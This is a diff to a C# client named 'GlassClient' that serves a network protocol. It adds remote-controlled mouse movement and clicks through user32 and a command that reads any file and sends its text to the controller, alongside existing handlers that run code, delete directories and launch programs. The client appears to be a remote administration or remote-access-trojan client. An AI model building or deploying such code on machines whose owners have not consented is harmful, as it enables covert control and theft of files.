@@ -7,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
@@ -112,6 +113,18 @@ namespace GlassClient
                     case (byte)GlassProtocol.RequestCodeRun:
                         if (!(ExecuteCode(Reader.ReadString()))) return false;
                         break;
+                    case (byte)GlassProtocol.RequestSetMousePosition:
+                        if (!(SetMousePosition((int)Reader.ReadInt64(), (int)Reader.ReadInt64()))) return false;
+                        break;
+                    case (byte)GlassProtocol.RequestLeftMouseClick:
+                        if (!(LeftMouseClick())) return false;
+                        break;
+                    case (byte)GlassProtocol.RequestRightMouseClick:
+                        if (!(RightMouseClick())) return false;
+                        break;
+                    case (byte)GlassProtocol.SendingFileText:
+                        if (!(SendFileText(Reader.ReadString()))) return false;
+                        break;
                 }
             }
             catch (Exception ex)
@@ -124,7 +137,7 @@ namespace GlassClient
         public bool DeleteDir(string path)
         {
             if (!Directory.Exists(path))
-            {
+            {   
                 if (!SendError("Directory not found " + path)) return false;
                 return true;
             }
@@ -239,6 +252,43 @@ namespace GlassClient
             return true;
         }
 
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
+
+        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
+        private const int MOUSEEVENTF_LEFTUP = 0x04;
+        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
+        private const int MOUSEEVENTF_RIGHTUP = 0x10;
+        public bool LeftMouseClick()
+        {
+            try
+            {
+                int X = Cursor.Position.X;
+                int Y = Cursor.Position.Y;
+                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)X, (uint)Y, 0, 0);
+            }
+            catch (Exception ex)
+            {
+                if (!(SendError("Could not click left mouse: " + ex.Message))) return false;
+            }
+            return true;
+        }
+
+        public bool RightMouseClick()
+        {
+            try
+            {
+                int X = Cursor.Position.X;
+                int Y = Cursor.Position.Y;
+                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)X, (uint)Y, 0, 0);
+            }
+            catch (Exception ex)
+            {
+                if (!(SendError("Could not click right mouse: " + ex.Message))) return false;
+            }
+            return true;
+        }
+
         public bool SendByte(byte b)
         {
             try
@@ -296,6 +346,22 @@ namespace GlassClient
             catch (Exception ex)
             {
                 if (!(SendError("Could not send file: " + ex.Message))) return false;
+            }
+            return true;
+        }
+
+        public bool SendFileText(string path)
+        {
+            try
+            {
+                string text = File.ReadAllText(path);
+                if (!(SendProtocol(GlassProtocol.SendingFileText))) return false;
+                if (!(SendInt(text.Length))) return false;
+                if (!(SendString(text))) return false;
+            }
+            catch (Exception ex)
+            {
+                if (!(SendError("Could not send file text: " + ex.Message))) return false;
             }
             return true;
         }
@@ -424,6 +490,19 @@ namespace GlassClient
             {
                 return false;
             }
+        }
+
+        public bool SetMousePosition(int x, int y)
+        {
+            try
+            {
+                Cursor.Position = new Point(x, y);
+            }
+            catch (Exception ex)
+            {
+                if (!(SendError("Could not set mouse position: " + ex.Message))) return false;
+            }
+            return true;
         }
 
         public bool StartProgram(string path, string args)
